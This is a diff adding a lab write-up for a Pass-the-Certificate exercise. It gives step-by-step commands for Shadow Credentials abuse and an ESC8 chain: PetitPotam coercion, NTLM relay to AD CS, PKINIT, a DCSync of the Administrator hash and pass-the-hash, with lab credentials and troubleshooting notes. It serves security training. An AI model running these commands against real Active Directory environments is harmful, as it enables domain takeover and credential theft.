@@ -1,0 +1,286 @@
+---
+title: "Pass the Certificate"
+---
+
+## Overview
+
+**PKINIT** (*Public Key Cryptography for Initial Authentication*) is a Kerberos extension that lets you use a **certificate + private key** during the very first Kerberos exchange (the AS‑REQ/AS‑REP) instead of a password or NT hash. It's what makes smart‑card logon work — the private key on the card proves who you are.
+
+**Pass‑the‑Certificate** = abusing that. If you can get hold of (or mint) an X.509 certificate that the KDC trusts for an account, you can turn it into a **TGT** for that account — no password needed. Once you have a TGT you're back in plain **Pass‑the‑Ticket** territory.
+
+Two ways to obtain such a certificate show up constantly:
+
+- **AD CS abuse** (ESC1–ESC8): trick or relay a Certificate Authority into issuing you a cert for a victim account.
+- **Shadow Credentials**: write your *own* public key into a victim's `msDS-KeyCredentialLink`, then authenticate as them with the matching private key.
+
+---
+
+# The big picture (read this first)
+
+This box has **two flags**, reached by **two different certificate attacks**. Here's the whole story in plain terms.
+
+<Info>
+**Lab layout**
+
+| Machine | Role | IP |
+|---|---|---|
+| **PTCDC01** | Domain Controller / KDC | `10.129.234.174` |
+| **PTCCA01** | AD CS Certificate Authority | `10.129.234.172` |
+| Domain | `INLANEFREIGHT.LOCAL` | |
+| Foothold creds | `wwhite : package5shores_topher1` | |
+</Info>
+
+**Flag 1 — jpinkman's desktop — via Shadow Credentials.**
+`wwhite` has the `AddKeyCredentialLink` right over `jpinkman` (visible as that edge in BloodHound). That means `wwhite` can write into jpinkman's `msDS-KeyCredentialLink` attribute. So you generate a key pair, drop the public key there, and now you can authenticate **as jpinkman** with the private key → get a TGT as jpinkman → WinRM in as jpinkman → read the flag. You become jpinkman; you don't need his password.
+
+**Flag 2 — Administrator's desktop — via ESC8 → DCSync.**
+This is a chain of five links, each feeding the next:
+
+1. **ESC8 (NTLM relay to AD CS).** The CA runs a web‑enrollment page over HTTP (`/certsrv`). Windows machine accounts will happily NTLM‑authenticate to you if you *coerce* them. So you stand up a relay (`ntlmrelayx`/`certipy relay`) that forwards any NTLM auth it receives to the CA's enrollment page and requests a certificate on the victim's behalf.
+2. **Coercion.** You force the **Domain Controller's** machine account (`DC01$`) to authenticate to your relay, using PetitPotam/PrinterBug. The relay catches `DC01$`'s auth and the CA hands you a **certificate for `DC01$`**.
+3. **PKINIT.** You convert that `DC01$` certificate into a **Kerberos TGT** for `DC01$` (`gettgtpkinit`).
+4. **DCSync.** `DC01$` is a Domain Controller account, so it has directory‑replication rights. Acting as `DC01$`, you ask the DC to replicate the **Administrator's password hash** to you (`secretsdump`). This is DCSync — you're pretending to be another DC syncing data.
+5. **Pass‑the‑Hash.** You log in as **Administrator** using that NT hash (no plaintext password needed) and read the flag.
+
+Why coerce the DC and not the CA? Because only a **Domain Controller** account can DCSync. A cert for `CA01$` (the CA server) is useless for that.
+
+---
+
+# Tooling & install
+
+<Note>
+**All installs that hit "externally-managed-environment" (PEP 668) need `pipx`, or `pip ... --break-system-packages`. Prefer `pipx` — it isolates each tool.**
+
+</Note>
+
+```bash
+pipx install certipy-ad        # command is `certipy`
+pipx install coercer           # command is `coercer`
+# pywhisker (real package → pipx works from repo root)
+git clone https://github.com/ShutdownRepo/pywhisker && cd pywhisker && pipx install .
+# PKINITtools = loose scripts, NOT a package → venv + run directly
+git clone https://github.com/dirkjanm/PKINITtools && cd PKINITtools
+python3 -m venv .venv && source .venv/bin/activate && pip install -r requirements.txt
+# if "Error detecting the version of libcrypto":
+pip3 install -I git+https://github.com/wbond/oscrypto.git
+```
+
+To run a loose script (no package metadata) from anywhere, wrap it:
+
+```bash
+cat > ~/.local/bin/gettgtpkinit <<'EOF'
+#!/bin/bash
+exec /home/kali/Desktop/PKINITtools/.venv/bin/python /home/kali/Desktop/PKINITtools/gettgtpkinit.py "$@"
+EOF
+chmod +x ~/.local/bin/gettgtpkinit
+```
+
+---
+
+# Flag 1 — Shadow Credentials → jpinkman
+
+```bash
+# 1. write our key into jpinkman's msDS-KeyCredentialLink → get a PFX + its password
+pywhisker --dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' \
+  --target jpinkman --action add
+#   -> Saved PFX ... eFUVVTPf.pfx   |   Password: bmRH4LK7UwPrAOfvIx6W
+
+# 2. PFX -> TGT as jpinkman
+python3 gettgtpkinit.py -cert-pfx eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' \
+  -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+
+# 3. Pass-the-Ticket -> WinRM in AS jpinkman (Kerberos)
+export KRB5CCNAME=/tmp/jpinkman.ccache
+klist                                   # Default principal: jpinkman@INLANEFREIGHT.LOCAL
+evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
+```
+
+```powershell
+type C:\Users\jpinkman\Desktop\flag.txt
+```
+
+<Note>
+**Q1 flag**
+
+`FLAG: <paste jpinkman flag here>`
+</Note>
+
+jpinkman is in **Remote Management Users** (grants WinRM). `wwhite` is not, and even when wwhite can WinRM in, it gets `Access denied` on `C:\Users\jpinkman` — that's the whole point: you must *be* jpinkman, which the ticket makes you.
+
+---
+
+# Flag 2 — ESC8 → DCSync → Administrator
+
+### Step 0 — confirm the relay target exists
+
+`certipy find` runs over **LDAP**, which only the **DC** answers. The CA's web enrollment is checked separately, and the CA's DNS name may resolve to an unreachable internal IP — map it to the reachable one first so the check is accurate:
+
+```bash
+echo "10.129.234.172  CA01.inlanefreight.local"            | sudo tee -a /etc/hosts
+echo "10.129.234.174  DC01.inlanefreight.local dc01 inlanefreight.local" | sudo tee -a /etc/hosts
+
+certipy find -u wwhite@inlanefreight.local -p 'package5shores_topher1' -dc-ip 10.129.234.174 -stdout
+curl -s --max-time 8 -o /dev/null -w "HTTP %{http_code}\n" http://10.129.234.172/certsrv/   # 401 = web enrollment live
+```
+
+A `401` means web enrollment is up → ESC8 is viable. Pick a template that is **Enabled**, grants **Client Authentication**, and that **Domain Controllers can enroll in** — here `KerberosAuthentication` qualifies.
+
+### Step 1 — relay + coerce (the cert)
+
+```bash
+# Terminal 1 — relay (certipy relay is sturdier than ntlmrelayx for ADCS retrieval)
+certipy relay -target http://10.129.234.172 -template KerberosAuthentication -timeout 30
+
+# Terminal 2 — coerce the DC (.174) ONCE; PetitPotam is the reliable method here
+coercer coerce -u wwhite -p 'package5shores_topher1' -d inlanefreight.local \
+  -t 10.129.234.174 -l <tun0-IP> --filter-method-name EfsRpcAddUsersToFile
+```
+
+Success in terminal 1: `Authenticating connection from INLANEFREIGHT/DC01$ ... SUCCEED` → `Saved certificate and private key to 'dc01.pfx'`.
+
+### Step 2 — cert → TGT as DC01$ (PKINIT)
+
+```bash
+python3 gettgtpkinit.py -cert-pfx /home/kali/dc01.pfx -dc-ip 10.129.234.174 \
+  'inlanefreight.local/dc01$' /tmp/dc.ccache
+export KRB5CCNAME=/tmp/dc.ccache
+klist                                   # Default principal: dc01$@INLANEFREIGHT.LOCAL
+```
+
+### Step 3 — DCSync the Administrator hash
+
+```bash
+impacket-secretsdump -k -no-pass -just-dc-user Administrator -dc-ip 10.129.234.174 \
+  'INLANEFREIGHT.LOCAL/dc01$@dc01.inlanefreight.local'
+#   -> Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NThash>:::
+
+# if impacket's secretsdump errors, use netexec with the same ticket:
+nxc smb 10.129.234.174 -k --use-kcache --ntds --user Administrator
+```
+
+### Step 4 — Pass‑the‑Hash → read the flag
+
+```bash
+evil-winrm -i 10.129.234.174 -u Administrator -H <NThash>
+```
+
+```powershell
+type C:\Users\Administrator\Desktop\flag.txt
+```
+
+<Note>
+**Q2 flag**
+
+`FLAG: <paste Administrator flag here>`
+</Note>
+
+<Warning>
+**Use `-u Administrator -H <hash>` (Pass-the-Hash), NOT `-r` here. `-r` is Kerberos mode and would log you in as whoever is in `KRB5CCNAME` (DC01$) — a machine account with no Administrator desktop.**
+
+</Warning>
+
+---
+
+# Concept deep‑dives
+
+**NTLM relay (ESC8).** NTLM auth proves identity by a challenge/response, but it doesn't bind to *where* it's going. So if you can get a victim to NTLM‑authenticate to *you*, you can forward (relay) that exact authentication to a third service and act as the victim there. ESC8 relays it to the CA's web‑enrollment page and requests a certificate.
+
+**Coercion.** Machines can be tricked into initiating authentication to an arbitrary host via certain RPC calls — PrinterBug (MS‑RPRN print‑spooler), PetitPotam (MS‑EFSR), DFSCoerce (MS‑DFSNM). You point the "connect back to" address at your relay. This is how you *make* `DC01$` authenticate on demand instead of waiting.
+
+**PKINIT.** Turns the cert+key into a TGT. The KDC validates the cert and issues Kerberos tickets, so from there everything is normal Kerberos.
+
+**DCSync.** Domain Controllers replicate directory data (including password hashes) between each other over the MS‑DRSR protocol. Any account with the *Replicating Directory Changes (All)* rights can ask a DC to send those hashes. The `Domain Controllers` group has these rights by default, so a `DC01$` ticket can DCSync any user's hash.
+
+**Pass‑the‑Hash.** Many Windows auth paths accept the NT hash directly in place of the plaintext password. So with Administrator's hash you authenticate as Administrator without ever cracking it.
+
+---
+
+# Troubleshooting log (everything that bit me, and the fix)
+
+<Warning>
+**The single biggest one: PKINIT / LDAPS "Connection reset by peer" = **VPN MTU****
+
+Operations that send a **large, certificate‑bearing packet** (PKINIT AS‑REQ, LDAPS client‑cert handshake) got reset, while small‑packet ops (NTLM relay, coercion, DCSync) worked fine. That pattern = packet **fragmentation over the HTB VPN**. Fix:
+```bash
+sudo ip link set dev tun0 mtu 1200      # drop further to 1100 if needed
+```
+Every working writeup used an HTB‑hosted box (Pwnbox), which sits inside the network with a correct MTU — masking this on a local Kali. This was *the* fix that unblocked the whole chain.
+</Warning>
+
+| Symptom | Cause | Fix |
+|---|---|---|
+| `xfreerdp: Cannot find KDC for realm INLANEFREIGHT.LOCAL` | No realm→KDC mapping in `/etc/krb5.conf`; leftover config from the previous module pointed at a different realm | Add a `[realms]` block + `/etc/hosts` for this DC, **or** force NTLM with `/u:'DOMAIN\user'` and drop `/d:` |
+| RDP connects then `Connection reset by peer` (no Kerberos error) | `wwhite` has no "log on through RDP" right on the DC; NLA rejects | Not fixable as wwhite — RDP isn't the path; use WinRM |
+| WinRM as wwhite → `Access denied` on `C:\Users\jpinkman` | You're wwhite, not jpinkman | Become jpinkman via Shadow Credentials, then WinRM as jpinkman |
+| `printerbug.py: No module named 'nxc'` | You grabbed netexec's *internal* module, not the standalone | Clone `dirkjanm/krbrelayx`, or use `nxc ... -M coerce_plus` |
+| printerbug `KeyError: 'identity'` logging crash | krbrelayx vs system **impacket 0.14** logger mismatch | Run it in a venv with `pip install impacket==0.12.0`, or use netexec/Coercer. (The RPC calls actually fired — it only failed to *print*.) |
+| Coercion `0x6ba RPC_S_SERVER_UNAVAILABLE` | Print Spooler off → PrinterBug method dead | Use another method (PetitPotam/DFSCoerce via Coercer/coerce_plus) |
+| Coercer `NO_AUTH_RECEIVED` | That method didn't fire / nothing caught the callback | Use a method that returns **`ERROR_BAD_NETPATH`** (= success, server tried to reach you); ensure listener is up and `-l` is your live `tun0` |
+| Coercer `ERROR_BAD_NETPATH` | **This is success**, not an error — the server accepted the trigger | Nothing to fix; watch your relay/listener |
+| Relayed the wrong machine (`CA01$`) | Coerced `10.129.234.172` (the CA) | Coerce the **DC** `10.129.234.174` so `DC01$` is relayed (only a DC can DCSync) |
+| ntlmrelayx `no more targets left` / `Skipping ... attack already performed` | It only attacks each account once; later connections are ignored noise | Normal — the cert was issued on the *first* connection |
+| ntlmrelayx stuck at `Getting certificate...`, no `.pfx` | Retrieval hiccup on single‑use coerced session | Use `certipy relay` (does submit+retrieve in one shot) and coerce **once** (`--always-continue` floods it) |
+| `certipy find` LDAP `timed out` | Pointed `-dc-ip` at the CA; LDAP only runs on the DC | `-dc-ip` = **DC** (10.129.234.174) |
+| certipy "Web Enrollment: False" / can't reach CA | CA DNS name resolved to unreachable internal `172.16.119.12` | Map `CA01.inlanefreight.local` → reachable IP in `/etc/hosts`, re‑run |
+| `certipy relay ... Error during web certificate request: timed out` | CA slow + coercion flooding many sessions | `-timeout 30` and coerce **once** |
+| PKINIT / LDAPS `Connection reset by peer` | **MTU** (see danger box above) | `sudo ip link set dev tun0 mtu 1200` |
+| `certipy auth` / PKINIT reset, clock looks right | Often still clock skew — your clock must match the **DC**, not internet NTP (labs run their own time) | `sudo timedatectl set-ntp off`; read DC time `nmap -p445 --script smb2-time <DC>`; `sudo date -u -s "..."`. Verify `date -u` ≈ DC within 5 min |
+| `certipy auth`: "Found multiple identities" | Cert has several SANs | Pick the index for `DC01.inlanefreight.local (DC01$@...)` |
+| `OSError: No route to host` | Typo in the DC IP | Check the IP (`.234.` not `.216.`) |
+| PassTheCert / LDAPS `socket ssl wrapping error: Connection reset` | Kali OpenSSL‑3 default SECLEVEL too high for the DC's older Schannel | Lower SECLEVEL (see note below) — but on this box the real blocker was MTU |
+| `impacket-secretsdump: No module named 'pkg_resources'` | Running inside a venv (e.g. pinned `pki`) lacking setuptools | `deactivate` to use system impacket, or `pip install setuptools` in the venv |
+| `evil-winrm: OPENSSL_init_ssl (RuntimeError)` (Ruby) | Broken `/etc/ssl/openssl.cnf` — a typo'd/duplicate section (`[system_default_deck]` instead of `[system_default_sect]`) makes OpenSSL fail to initialize | Revert `/etc/ssl/openssl.cnf` (fix the typo / remove the added block); quick bypass: `OPENSSL_CONF=/dev/null evil-winrm ...` |
+| Stale `KRB5CCNAME` from a previous module | Old ccache auto‑loaded by Kerberos tools | `unset KRB5CCNAME`; re‑export the correct ccache; remove it from your shell rc if you added it there |
+
+<Tip>
+**OpenSSL SECLEVEL lower (only if you actually need LDAPS from Kali)**
+
+Append to `/etc/ssl/openssl.cnf` — and **type the section names exactly**, a typo bricks OpenSSL:
+```ini
+[openssl_init]
+ssl_conf = ssl_sect
+[ssl_sect]
+system_default = system_default_sect
+[system_default_sect]
+CipherString = DEFAULT@SECLEVEL=0
+MinProtocol = TLSv1.0
+```
+Back it up first (`sudo cp /etc/ssl/openssl.cnf{,.bak}`). If it already has an `[openssl_init]`, add `ssl_conf = ssl_sect` *into* it rather than duplicating.
+</Tip>
+
+---
+
+# No PKINIT? → PassTheCert (fallback)
+
+If the KDC genuinely won't accept a cert for pre‑auth (an EKU limitation, not a transient reset), use **PassTheCert** to authenticate over **LDAPS** with the cert and act there — e.g. grant a foothold account DCSync rights, then DCSync:
+
+```bash
+certipy cert -pfx dc01.pfx -nokey  -out dc01.crt
+certipy cert -pfx dc01.pfx -nocert -out dc01.key
+python3 passthecert.py -action modify_user -crt dc01.crt -key dc01.key \
+  -domain inlanefreight.local -dc-ip 10.129.234.174 -target wwhite -elevate
+impacket-secretsdump 'inlanefreight.local/wwhite:package5shores_topher1'@10.129.234.174 -just-dc-user Administrator
+```
+
+`-target` = the account you **already control** (wwhite) and want to grant rights to — never the victim (Administrator). On this box PKINIT worked once the MTU was fixed, so this stayed a fallback.
+
+---
+
+# Key Takeaways
+
+- **Pass‑the‑Certificate** = certificate → **TGT** (PKINIT) → Pass‑the‑Ticket.
+- **Shadow Credentials** (`AddKeyCredentialLink` → write `msDS-KeyCredentialLink`) makes you *become* a user with no password — clean route to jpinkman.
+- **ESC8** = coerce a **DC** → NTLM‑relay to AD CS web enrollment → cert for `DC01$` → DCSync → Administrator.
+- Coerce the **DC**, not the CA — only a DC account can DCSync.
+- Coercer result codes: **`ERROR_BAD_NETPATH` = success**, `NO_AUTH_RECEIVED` = didn't fire.
+- `certipy relay` + **coerce once** is more reliable than ntlmrelayx + flooding for ADCS cert retrieval.
+- Kerberos needs the clock within ~5 min of the **DC** (not internet NTP).
+- **PKINIT/LDAPS resets while small ops work = VPN MTU.** `sudo ip link set dev tun0 mtu 1200` was the master fix.
+- Don't over‑edit `/etc/ssl/openssl.cnf` — one typo'd section name kills OpenSSL for every tool that links it.
+
+---
+
+## See also
+- [Pass the Ticket from Linux](/password-attacks/pass-the-ticket-from-linux)
+- [Pass the Ticket from Windows](/password-attacks/pass-the-ticket-from-windows)
+- [Pass the Hash](/password-attacks/pass-the-hash)
